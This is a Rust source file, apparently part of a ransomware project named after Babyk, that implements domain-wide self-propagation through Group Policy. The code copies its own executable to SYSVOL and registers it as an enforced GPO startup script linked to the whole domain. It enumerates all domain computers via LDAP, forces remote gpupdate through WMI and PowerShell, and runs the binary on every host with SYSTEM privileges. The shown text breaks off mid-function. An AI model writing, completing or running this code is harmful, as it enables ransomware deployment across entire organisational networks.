use std::{
    fs::File,
    io::Write,
    path::PathBuf,
    time::{SystemTime, UNIX_EPOCH, Duration},
    process::Command,
    env,
    collections::HashSet,
    sync::Arc,
};

use std::result::Result;
use std::io;
use std::sync::OnceLock;
use std::sync::atomic::{AtomicUsize, Ordering};

use tokio::time::timeout;
use tokio::fs;

use super::gpospread::{GPOError, ImplementationMode};

#[cfg(windows)]
use windows::{
    core::{PWSTR, PCWSTR, w},
    Win32::System::SystemInformation::{
        GetComputerNameExW, GetVersionExW, GetSystemInfo, OSVERSIONINFOW, SYSTEM_INFO,
        ComputerNameDnsDomain, ComputerNameDnsHostname,
    },
    Win32::System::Registry::{
        RegCreateKeyExW, RegSetValueExW, RegCloseKey, HKEY, HKEY_LOCAL_MACHINE,
        REG_SAM_FLAGS, KEY_ALL_ACCESS, REG_SZ, RegOpenKeyExW,
    },
    Win32::Foundation::{HANDLE, BOOL},
    Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED, CoUninitialize},
};

#[cfg(windows)]
use wmi::{COMLibrary, WMIConnection};
#[cfg(windows)]
use ldap3::{LdapConn, Scope, SearchEntry, LdapConnAsync};
#[cfg(windows)]
use ipconfig::{get_adapters, Adapter};
#[cfg(windows)]
use local_ip_address::local_ip;

#[cfg(windows)]
struct ComInitializer;

#[cfg(windows)]
impl ComInitializer {
    fn new() -> Result<Self, GPOError> {
        unsafe {
            CoInitializeEx(None, COINIT_MULTITHREADED).map_err(|e| {
                GPOError(format!("COM 初始化失败: {}", e))
            })?;
            Ok(Self)
        }
    }
}

#[cfg(windows)]
impl Drop for ComInitializer {
    fn drop(&mut self) {
        unsafe {
            CoUninitialize();
        }
    }
}

#[derive(Debug)]
struct MachineInfo {
    hostname: String,
    ip_address: String,
    mac_address: String,
    domain: String,
    os_version: String,
    architecture: String,
    timestamp: u64,
    location: String,
    user: String,
}

pub fn safe_gpo_deployment_with_mode(mode: ImplementationMode) -> Result<(), GPOError> {
    let mut deployer = GPODeployer::new(mode);
    
    // 使用 panic 捕获来防止整个程序崩溃
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        // 使用 new_current_thread 来创建在独立线程中的 Runtime
        // 这样可以避免和主线程的 Tokio Runtime 冲突
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        let result = rt.block_on(deployer.execute());
        drop(rt);
        result
    })) {
        Ok(result) => result,
        Err(_) => Err(GPOError("GPO 部署过程中发生 panic".to_string())),
    }
}

pub fn safe_gpo_deployment() -> Result<(), GPOError> {
    safe_gpo_deployment_with_mode(ImplementationMode::WindowsAPI)
}

struct GPODeployer {
    exe_name: String,
    service_name: String,
    task_name: String,
    target_path: PathBuf,
    data_path: PathBuf,
    gpo_name: String,
    gpo_guid: String,
    domain_name: String,
    sysvol_path: PathBuf,
    current_exe_path: PathBuf,
    implementation_mode: ImplementationMode,
    domain_dn_cache: Option<String>,
}

impl GPODeployer {
    fn new(mode: ImplementationMode) -> Self {
        let exe_name = format!("{}.exe", Self::generate_random_name(6));
        let gpo_name = format!("GPO_{}", Self::generate_random_name(8));
        let gpo_guid = Self::generate_gpo_guid_static();
        let current_exe_path = env::current_exe().unwrap_or_else(|_| PathBuf::from("babyk-rs.exe"));
        
        Self {
            exe_name: exe_name.clone(),
            service_name: Self::generate_random_name(8),
            task_name: Self::generate_random_name(8),
            target_path: PathBuf::from("C:\\Windows\\System32\\"),
            data_path: PathBuf::from("C:\\Windows\\Temp\\"),
            gpo_name,
            gpo_guid,
            domain_name: String::new(),
            sysvol_path: PathBuf::new(),
            current_exe_path,
            implementation_mode: mode,
            domain_dn_cache: None,
        }
    }

    async fn execute(&mut self) -> Result<(), GPOError> {
        println!("[*] 开始 GPO 自动部署流程...");
        println!("[*] 实现模式: {:?}", self.implementation_mode);
        
        #[cfg(windows)]
        {
            println!("[*] 收集机器信息...");
            let machine_info = self.collect_machine_info()?;
            self.save_machine_info_async(&machine_info).await?;
            
            println!("[*] 当前程序路径: {}", self.current_exe_path.display());
            
            println!("[*] 获取域名信息...");
            self.domain_name = machine_info.domain.clone();
            let script_name = format!("{}.exe", Self::generate_random_name(8));
            self.sysvol_path = PathBuf::from(format!(
                "\\\\{}\\SYSVOL\\{}\\scripts\\{}",
                machine_info.hostname,
                machine_info.domain,
                script_name
            ));
            
            println!("[*] 复制自身程序到 SYSVOL...");
            self.copy_self_to_sysvol_async().await?;
            
            println!("[*] 创建新的 GPO: {}", self.gpo_name);
            self.create_gpo()?;
            
            println!("[*] 配置 GPO 启动脚本...");
            self.configure_gpo_startup_script(&script_name)?;
            
            println!("[*] 链接 GPO 到域...");
            self.link_gpo_to_domain().await?;
            
            println!("[*] 获取域内所有计算机...");
            let domain_computers = self.get_domain_computers().await?;
            println!("[+] 找到 {} 台域计算机", domain_computers.len());
            
            println!("[*] 远程强制更新所有域计算机的组策略...");
            self.remote_force_gpupdate(&domain_computers)?;
            
            println!("\n[!] GPO 已部署并强制更新");
            println!("[!] 启动脚本将在计算机下次启动时以 SYSTEM 权限执行");
            
            println!("[*] 选择执行方式：立即执行（不重启）");
            let script_path = self.sysvol_path.to_str()
                .ok_or_else(|| GPOError("Invalid sysvol path".to_string()))?;
            self.remote_execute_programs(&domain_computers, script_path)?;
            
            println!("[+] GPO 部署完成！程序已在所有域计算机上立即执行（以 SYSTEM 权限）");
        }
        
        #[cfg(not(windows))]
        {
            println!("[*] GPO 部署仅在 Windows 平台支持");
            return Err(GPOError("GPO deployment is only supported on Windows".to_string()));
        }
        
        Ok(())
    }

    #[cfg(windows)]
    fn collect_machine_info(&self) -> Result<MachineInfo, GPOError> {
        unsafe {
            let mut hostname_buffer = [0u16; 256];
            let mut hostname_size = hostname_buffer.len() as u32;
            let mut hostname = String::new();
            if GetComputerNameExW(ComputerNameDnsHostname, PWSTR(hostname_buffer.as_mut_ptr()), &mut hostname_size).is_ok() {
                hostname = String::from_utf16_lossy(&hostname_buffer[..hostname_size as usize]);
            }

            let ip_address = self.get_simple_ip_address();
            let mac_address = self.get_simple_mac_address();
            
            let mut domain_buffer = [0u16; 256];
            let mut domain_size = domain_buffer.len() as u32;
            let mut domain = String::new();
            if GetComputerNameExW(ComputerNameDnsDomain, PWSTR(domain_buffer.as_mut_ptr()), &mut domain_size).is_ok() {
                domain = String::from_utf16_lossy(&domain_buffer[..domain_size as usize]);
            }

            let mut os_version = String::new();
            let mut os_info = OSVERSIONINFOW {
                dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as u32,
                ..Default::default()
            };
            if GetVersionExW(&mut os_info).is_ok() {
                os_version = format!("{}.{}.{}", os_info.dwMajorVersion, os_info.dwMinorVersion, os_info.dwBuildNumber);
            }

            let mut sys_info = SYSTEM_INFO::default();
            GetSystemInfo(&mut sys_info);
            let architecture = "Unknown".to_string();

            let user = whoami::username();

            let timestamp = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();

            let location = "Unknown".to_string();

            Ok(MachineInfo {
                hostname,
                ip_address,
                mac_address,
                domain,
                os_version,
                architecture,
                timestamp,
                location,
                user,
            })
        }
    }

    fn get_simple_ip_address(&self) -> String {
        #[cfg(windows)]
        {
            match local_ip() {
                Ok(ip) => ip.to_string(),
                Err(_) => "127.0.0.1".to_string(),
            }
        }
        #[cfg(not(windows))]
        {
            "127.0.0.1".to_string()
        }
    }

    fn get_simple_mac_address(&self) -> String {
        #[cfg(windows)]
        {
            match get_adapters() {
                Ok(adapters) => {
                    for adapter in adapters {
                        if let Some(physical_address) = adapter.physical_address() {
                            if !physical_address.is_empty() {
                                let result: String = physical_address
                                    .iter()
                                    .enumerate()
                                    .map(|(i, b)| {
                                        if i > 0 {
                                            format!(":{:02x}", b)
                                        } else {
                                            format!("{:02x}", b)
                                        }
                                    })
                                    .collect();
                                return result;
                            }
                        }
                    }
                    "00:00:00:00:00:00".to_string()
                }
                Err(_) => "00:00:00:00:00:00".to_string(),
            }
        }
        #[cfg(not(windows))]
        {
            "00:00:00:00:00:00".to_string()
        }
    }

    async fn save_machine_info_async(&self, info: &MachineInfo) -> Result<(), GPOError> {
        use tokio::fs::File;
        use tokio::io::AsyncWriteExt;
        
        let file_path = self.data_path.join("machine_info.txt");
        
        let mut file = File::create(file_path).await
            .map_err(|e| GPOError(format!("创建文件失败: {}", e)))?;
        
        let content = format!(
            "主机名: {}\nIP地址: {}\nMAC地址: {}\n域名: {}\n操作系统版本: {}\n系统架构: {}\n时间戳: {}\n位置: {}\n用户名: {}\n",
            info.hostname,
            info.ip_address,
            info.mac_address,
            info.domain,
            info.os_version,
            info.architecture,
            info.timestamp,
            info.location,
            info.user
        );
        
        file.write_all(content.as_bytes()).await
            .map_err(|e| GPOError(format!("写入文件失败: {}", e)))?;
        
        Ok(())
    }

    async fn copy_self_to_sysvol_async(&self) -> Result<(), GPOError> {
        use tokio::fs;
        
        if !self.current_exe_path.exists() {
            return Err(GPOError(format!(
                "当前程序不存在: {}",
                self.current_exe_path.display()
            )));
        }

        let sysvol_path_str = self.sysvol_path.to_str()
            .ok_or_else(|| GPOError("Invalid sysvol path".to_string()))?;

        if sysvol_path_str.starts_with("\\\\") {
            let parts: Vec<&str> = sysvol_path_str.split('\\').collect();
            if parts.len() < 4 {
                return Err(GPOError(format!(
                    "无效的SYSVOL路径格式: {}",
                    sysvol_path_str
                )));
            }

            let server = parts[2];
            let share = parts[3];

            let test_path = format!("\\\\{}\\{}", server, share);
            let test_result = timeout(
                tokio::time::Duration::from_secs(30),
                tokio::process::Command::new("cmd")
                    .args(["/C", "dir", &test_path])
                    .output()
            )
            .await;

            match test_result {
                Ok(Ok(output)) => {
                    if !output.status.success() {
                        return Err(GPOError(format!(
                            "无法访问网络路径 {}: {}",
                            test_path,
                            String::from_utf8_lossy(&output.stderr)
                        )));
                    }
                }
                Ok(Err(e)) => {
                    return Err(GPOError(format!(
                        "网络连接检查失败 {}: {}",
                        test_path, e
                    )));
                }
                Err(_) => {
                    return Err(GPOError(format!(
                        "网络连接检查超时 (30秒): {}",
                        test_path
                    )));
                }
            }
        }

        if let Some(parent) = self.sysvol_path.parent() {
            fs::create_dir_all(parent).await.map_err(|e| {
                GPOError(format!("创建目录失败 {}: {}", parent.display(), e))
            })?;

            let test_file = parent.join(".write_test");
            match File::create(&test_file) {
                Ok(_) => {
                    let _ = std::fs::remove_file(&test_file);
                }
                Err(e) => {
                    return Err(GPOError(format!(
                        "没有写入权限 {}: {}",
                        parent.display(), e
                    )));
                }
            }
        }

        timeout(
            tokio::time::Duration::from_secs(300),
            fs::copy(&self.current_exe_path, &self.sysvol_path)
        )
        .await
        .map_err(|_| GPOError("文件复制超时 (300秒)".to_string()))?
        .map_err(|e| GPOError(format!("复制文件失败: {}", e)))?;

        if !self.sysvol_path.exists() {
            return Err(GPOError(format!(
                "文件复制后验证失败: {}",
                self.sysvol_path.display()
            )));
        }

        println!("[+] 自身程序已复制到: {}", self.sysvol_path.display());
        Ok(())
    }

    fn create_gpo(&self) -> Result<(), GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.create_gpo_powershell(),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.create_gpo_api(),
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn create_gpo_powershell(&self) -> Result<(), GPOError> {
        let ps_script = format!(
            "Import-Module GroupPolicy; New-GPO -Name '{}' -Comment 'Automated GPO deployment'",
            self.gpo_name
        );
        
        let output = Self::execute_powershell_with_timeout(&ps_script, 120, "创建GPO")?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("创建 GPO 失败: {}", error_msg)));
        }
        
        println!("[+] GPO '{}' 创建成功 (PowerShell 模式)", self.gpo_name);
        Ok(())
    }

    #[cfg(windows)]
    fn create_gpo_api(&self) -> Result<(), GPOError> {
        let _com_init = ComInitializer::new()?;

        unsafe {
            let gpo_path = self.get_gpo_path()?;
            
            std::fs::create_dir_all(&gpo_path).map_err(|e| {
                GPOError(format!("创建 GPO 目录失败: {}", e))
            })?;

            let gpt_ini_path = gpo_path.join("GPT.INI");
            let mut file = File::create(&gpt_ini_path)?;
            writeln!(&mut file, "[General]")?;
            writeln!(&mut file, "Version=65537")?;
            writeln!(&mut file, "displayName={}", self.gpo_name)?;
            writeln!(&mut file, "gPCUserExtensionNames=[{{35378EAC-683F-11D2-A89A-00C04FBBCFA2}}{{53B63368-1D85-4F50-BD75-DE6A79D16114}}]")?;
            writeln!(&mut file, "gPCMachineExtensionNames=[{{35378EAC-683F-11D2-A89A-00C04FBBCFA2}}{{53B63368-1D85-4F50-BD75-DE6A79D16114}}]")?;

            let machine_path = gpo_path.join("Machine");
            std::fs::create_dir_all(&machine_path).map_err(|e| {
                GPOError(format!("创建 Machine 目录失败: {}", e))
            })?;

            let user_path = gpo_path.join("User");
            std::fs::create_dir_all(&user_path).map_err(|e| {
                GPOError(format!("创建 User 目录失败: {}", e))
            })?;

            println!("[+] GPO '{}' 创建成功 (Windows API 模式)", self.gpo_name);
            Ok(())
        }
    }

    #[cfg(windows)]
    fn get_gpo_path(&self) -> Result<PathBuf, GPOError> {
        let sysvol = format!("\\\\{}\\SYSVOL\\{}\\Policies", 
            self.domain_name.split('.').next().unwrap_or("localhost"),
            self.domain_name
        );
        
        let gpo_guid = self.generate_gpo_guid();
        let gpo_path = PathBuf::from(sysvol).join(&gpo_guid);
        
        Ok(gpo_path)
    }

    fn generate_gpo_guid_static() -> String {
        use uuid::Uuid;
        Uuid::new_v4().to_string().to_uppercase()
    }

    fn generate_gpo_guid(&self) -> String {
        self.gpo_guid.clone()
    }

    fn domain_to_dn_cached(&mut self) -> String {
        if let Some(ref cached) = self.domain_dn_cache {
            return cached.clone();
        }
        
        let result = self.domain_to_dn();
        self.domain_dn_cache = Some(result.clone());
        result
    }

    fn configure_gpo_startup_script(&self, script_name: &str) -> Result<(), GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.configure_gpo_startup_script_powershell(script_name),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.configure_gpo_startup_script_api(script_name),
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn configure_gpo_startup_script_powershell(&self, script_name: &str) -> Result<(), GPOError> {
        let ps_script = format!(
            r#"
            Import-Module GroupPolicy;
            $gpo = Get-GPO -Name '{}';
            $gpoPath = $gpo.Path;
            
            $startupPath = Join-Path $gpoPath "Machine\Scripts\Startup";
            if (-not (Test-Path $startupPath)) {{
                New-Item -ItemType Directory -Path $startupPath -Force | Out-Null;
            }}
            
            Copy-Item -Path '{}' -Destination (Join-Path $startupPath '{}') -Force;
            
            Set-GPPrefRegistryValue -Name 'StartupScript' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0' -ValueName 'Script' -Value '{}' -Type String;
            Set-GPPrefRegistryValue -Name 'StartupScript' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0' -ValueName 'Parameters' -Value '' -Type String;
            
            $iniContent = @"
[Startup]
0CmdLine={}
0Parameters=
"@
            $iniContent | Out-File -FilePath (Join-Path $gpoPath "Machine\Scripts\scripts.ini") -Encoding ASCII -Force;
            "#,
            self.gpo_name,
            self.sysvol_path.display(),
            script_name,
            script_name,
            script_name
        );
        
        let output = Self::execute_powershell_with_timeout(&ps_script, 120, "配置启动脚本")?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("配置启动脚本失败: {}", error_msg)));
        }
        
        println!("[+] 启动脚本配置成功 (PowerShell 模式)");
        Ok(())
    }

    #[cfg(windows)]
    fn configure_gpo_startup_script_api(&self, script_name: &str) -> Result<(), GPOError> {
        let gpo_path = self.get_gpo_path()?;
        
        let machine_scripts_path = gpo_path.join("Machine").join("Scripts");
        let startup_path = machine_scripts_path.join("Startup");
        
        std::fs::create_dir_all(&startup_path).map_err(|e| {
            GPOError(format!("创建启动脚本目录失败: {}", e))
        })?;
        
        let script_dest = startup_path.join(script_name);
        std::fs::copy(&self.sysvol_path, &script_dest).map_err(|e| {
            GPOError(format!("复制脚本文件失败: {}", e))
        })?;
        
        let scripts_ini_path = machine_scripts_path.join("scripts.ini");
        let mut file = File::create(&scripts_ini_path)?;
        writeln!(&mut file, "[Startup]")?;
        writeln!(&mut file, "0CmdLine={}", script_name)?;
        writeln!(&mut file, "0Parameters=")?;
        
        let psscripts_ini_path = machine_scripts_path.join("psscripts.ini");
        let mut psscripts_file = File::create(&psscripts_ini_path)?;
        writeln!(&mut psscripts_file, "[Startup]")?;
        writeln!(&mut psscripts_file, "0CmdLine={}", script_name)?;
        writeln!(&mut psscripts_file, "0Parameters=")?;
        
        unsafe {
            let mut hkey: HKEY = HKEY::default();
            let startup_key_path = format!(
                r"Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0"
            );
            
            let startup_key_path_wide: Vec<u16> = startup_key_path
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            
            let open_result = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(startup_key_path_wide.as_ptr()),
                0,
                KEY_ALL_ACCESS,
                &mut hkey
            );
            
            if open_result.is_err() {
                return Err(GPOError(format!(
                    "打开注册表键失败: {}",
                    open_result.unwrap_err()
                )));
            }
            
            let script_value_wide: Vec<u16> = script_name
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            
            let set_script_result = RegSetValueExW(
                hkey,
                PCWSTR(w!("Script").as_ptr()),
                0,
                REG_SZ,
                Some(std::slice::from_raw_parts(
                    script_value_wide.as_ptr() as *const u8,
                    script_value_wide.len() * 2
                ))
            );
            
            if set_script_result.is_err() {
                RegCloseKey(hkey);
                return Err(GPOError(format!(
                    "设置注册表值失败: {}",
                    set_script_result.unwrap_err()
                )));
            }
            
            let empty_value: Vec<u16> = vec![0];
            let set_params_result = RegSetValueExW(
                hkey,
                PCWSTR(w!("Parameters").as_ptr()),
                0,
                REG_SZ,
                Some(std::slice::from_raw_parts(
                    empty_value.as_ptr() as *const u8,
                    2
                ))
            );
            
            if set_params_result.is_err() {
                RegCloseKey(hkey);
                return Err(GPOError(format!(
                    "设置注册表值失败: {}",
                    set_params_result.unwrap_err()
                )));
            }
            
            let close_result = RegCloseKey(hkey);
            if close_result.is_err() {
                return Err(GPOError(format!(
                    "关闭注册表键失败: {}",
                    close_result.unwrap_err()
                )));
            }
        }
        
        println!("[+] 启动脚本配置成功 (Windows API 模式)");
        Ok(())
    }

    async fn link_gpo_to_domain(&mut self) -> Result<(), GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.link_gpo_to_domain_powershell(),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.link_gpo_to_domain_api().await,
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn link_gpo_to_domain_powershell(&self) -> Result<(), GPOError> {
        let ps_script = format!(
            "Import-Module GroupPolicy; New-GPLink -Name '{}' -Target '{}' -LinkEnabled Yes -Enforced Yes",
            self.gpo_name,
            if self.domain_name.is_empty() {
                "DC=domain,DC=local".to_string()
            } else {
                format!("DC={}", self.domain_name.replace(".", ",DC="))
            }
        );
        
        let output = Self::execute_powershell_with_timeout(&ps_script, 120, "链接GPO")?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("链接 GPO 失败: {}", error_msg)));
        }
        
        println!("[+] GPO 已链接到域 (PowerShell 模式)");
        Ok(())
    }

    #[cfg(windows)]
    async fn link_gpo_to_domain_api(&mut self) -> Result<(), GPOError> {
        use ldap3::{LdapConnAsync, Scope, SearchEntry};
        use tokio::time::{timeout, Duration};
        
        let ldap_url = format!("ldap://{}", self.domain_name.split('.').next().unwrap_or("localhost"));
        
        let (conn, mut ldap) = timeout(
            Duration::from_secs(30),
            LdapConnAsync::new(&ldap_url)
        )
        .await
        .map_err(|_| GPOError("LDAP 连接超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 连接失败: {}", e)))?;
        
        let _conn = conn;
        
        timeout(
            Duration::from_secs(30),
            ldap.simple_bind("", "")
        )
        .await
        .map_err(|_| GPOError("LDAP 绑定超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 绑定失败: {}", e)))?
        .success()
        .map_err(|e| GPOError(format!("LDAP 认证失败: {}", e)))?;
        
        let domain_dn = self.domain_to_dn_cached();
        let gplink = format!("[LDAP://CN={},CN=Policies,CN=System,{};0]", self.gpo_guid, domain_dn);
        
        let gplink_set: HashSet<&str> = [gplink.as_str()].iter().cloned().collect();
        let mods = vec![
            ldap3::Mod::Add("gPLink", gplink_set),
        ];
        
        timeout(
            Duration::from_secs(30),
            ldap.modify(&domain_dn, mods)
        )
        .await
        .map_err(|_| GPOError("LDAP 修改超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 修改失败: {}", e)))?
        .success()
        .map_err(|e| GPOError(format!("链接 GPO 失败: {}", e)))?;
        
        println!("[+] GPO 已链接到域 (Windows API 模式)");
        Ok(())
    }

    fn domain_to_dn(&self) -> String {
        if self.domain_name.is_empty() {
            return "DC=domain,DC=local".to_string();
        }
        
        let parts: Vec<&str> = self.domain_name.split('.').collect();
        let capacity = parts.iter().map(|p| p.len() + 3).sum::<usize>() - 1;
        let mut result = String::with_capacity(capacity);
        
        for (i, part) in parts.iter().enumerate() {
            if i > 0 {
                result.push_str(",DC=");
            } else {
                result.push_str("DC=");
            }
            result.push_str(part);
        }
        
        result
    }

    fn force_gpupdate(&self) -> Result<(), GPOError> {
        let output = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?
            .block_on(
                tokio::time::timeout(
                    tokio::time::Duration::from_secs(120),
                    tokio::process::Command::new("gpupdate")
                        .args(&["/force"])
                        .output()
                )
            )
            .map_err(|_| GPOError("gpupdate 执行超时 (120秒)".to_string()))?
            .map_err(|e| GPOError(format!("执行 gpupdate 失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            println!("[!] gpupdate 警告: {}", error_msg);
        } else {
            println!("[+] 组策略更新成功");
        }
        
        Ok(())
    }

    async fn get_domain_computers(&self) -> Result<Vec<String>, GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.get_domain_computers_powershell(),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.get_domain_computers_api().await,
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn get_domain_computers_powershell(&self) -> Result<Vec<String>, GPOError> {
        let ps_script = "Import-Module ActiveDirectory; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name";
        
        let output = Self::execute_powershell_with_timeout(ps_script, 120, "获取域计算机")?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("获取域计算机失败: {}", error_msg)));
        }
        
        let computers: Vec<String> = String::from_utf8_lossy(&output.stdout)
            .lines()
            .filter(|line| !line.trim().is_empty())
            .map(|line| line.trim().to_string())
            .collect();
        
        Ok(computers)
    }

    #[cfg(windows)]
    async fn get_domain_computers_api(&self) -> Result<Vec<String>, GPOError> {
        use ldap3::{LdapConnAsync, Scope, SearchEntry};
        use tokio::time::{timeout, Duration};
        
        let ldap_url = format!("ldap://{}", self.domain_name.split('.').next().unwrap_or("localhost"));
        
        let (conn, mut ldap) = timeout(
            Duration::from_secs(30),
            LdapConnAsync::new(&ldap_url)
        )
        .await
        .map_err(|_| GPOError("LDAP 连接超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 连接失败: {}", e)))?;
        
        let _conn = conn;
        
        timeout(
            Duration::from_secs(30),
            ldap.simple_bind("", "")
        )
        .await
        .map_err(|_| GPOError("LDAP 绑定超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 绑定失败: {}", e)))?
        .success()
        .map_err(|e| GPOError(format!("LDAP 认证失败: {}", e)))?;
        
        let domain_dn = self.domain_to_dn();
        
        let (rs, _res) = timeout(
            Duration::from_secs(30),
            ldap.search(
                &domain_dn,
                Scope::Subtree,
                "(objectClass=computer)",
                vec!["cn"]
            )
        )
        .await
        .map_err(|_| GPOError("LDAP 搜索超时 (30秒)".to_string()))?
        .map_err(|e| GPOError(format!("LDAP 搜索失败: {}", e)))?
        .success()
        .map_err(|e| GPOError(format!("LDAP 搜索结果失败: {}", e)))?;
        
        let mut computers = Vec::new();
        for entry in rs {
            let search_entry = SearchEntry::construct(entry);
            if let Some(cn) = search_entry.attrs.get("cn") {
                for cn_value in cn {
                    computers.push(cn_value.clone());
                }
            }
        }
        
        println!("[+] 找到 {} 台域计算机 (Windows API 模式)", computers.len());
        Ok(computers)
    }

    fn remote_force_gpupdate(&self, computers: &[String]) -> Result<(), GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.remote_force_gpupdate_powershell(computers),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.remote_force_gpupdate_api(computers),
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn remote_force_gpupdate_powershell(&self, computers: &[String]) -> Result<(), GPOError> {
        let mut success_count = 0;
        let mut failed_count = 0;
        
        for computer in computers {
            println!("[*] 正在更新 {} 的组策略...", computer);
            
            let ps_script = format!(
                "Invoke-Command -ComputerName {} -ScriptBlock {{ gpupdate /force }} -ErrorAction SilentlyContinue",
                computer
            );
            
            let output = Self::execute_powershell_with_timeout(&ps_script, 60, &format!("更新{}组策略", computer))?;
            
            if output.status.success() {
                println!("[+] {} 组策略更新成功", computer);
                success_count += 1;
            } else {
                println!("[!] {} 组策略更新失败", computer);
                failed_count += 1;
            }
        }
        
        println!("[+] 组策略更新完成: 成功 {}, 失败 {}", success_count, failed_count);
        Ok(())
    }

    #[cfg(windows)]
    fn remote_force_gpupdate_api(&self, computers: &[String]) -> Result<(), GPOError> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        let (success, failed) = rt.block_on(Self::execute_concurrent_async(
            computers,
            |computer| Self::remote_gpupdate_wmi_static_async(computer),
            10,
            "更新组策略",
        ))?;
        
        println!("[+] 组策略更新完成: 成功 {}, 失败 {}", success, failed);
        Ok(())
    }

    #[cfg(windows)]
    fn remote_gpupdate_wmi(&self, computer: &str) -> Result<(), GPOError> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        rt.block_on(Self::remote_gpupdate_wmi_static_async(computer.to_string()))
    }

    #[cfg(windows)]
    async fn remote_gpupdate_wmi_static_async(computer: String) -> Result<(), GPOError> {
        let computer_wmi = if computer.contains('.') || computer.contains('\\') {
            computer.clone()
        } else {
            format!("\\\\{}", computer)
        };
        
        let command_line = "gpupdate.exe /force /wait:0";
        
        let wmic_command = format!(
            "wmic /node:{} process call create \"{}\"",
            computer_wmi, command_line
        );
        
        Self::execute_command_with_timeout_async(
            &["cmd", "/C", &wmic_command],
            30,
            "WMI远程gpupdate"
        ).await?;
        
        println!("[+] WMI 远程 gpupdate 已触发: {}", computer);
        Ok(())
    }

    fn remote_restart_computers(&self, computers: &[String]) -> Result<(), GPOError> {
        println!("[*] 远程重启已禁用（使用立即执行模式）");
        Ok(())
    }

    fn remote_execute_programs(&self, computers: &[String], script_path: &str) -> Result<(), GPOError> {
        #[cfg(windows)]
        let mode = self.implementation_mode;
        #[cfg(not(windows))]
        let mode = match self.implementation_mode {
            ImplementationMode::WindowsAPI => ImplementationMode::PowerShell,
            other => other,
        };
        
        match mode {
            ImplementationMode::PowerShell => self.remote_execute_programs_powershell(computers, script_path),
            #[cfg(windows)]
            ImplementationMode::WindowsAPI => self.remote_execute_programs_api(computers, script_path),
            #[cfg(not(windows))]
            _ => unreachable!("WindowsAPI mode not supported on non-Windows platforms"),
        }
    }

    fn remote_execute_programs_powershell(&self, computers: &[String], script_path: &str) -> Result<(), GPOError> {
        let script_path_clone = Arc::new(script_path.to_string());
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        let (success, failed) = rt.block_on(Self::execute_concurrent_async(
            computers,
            move |computer| {
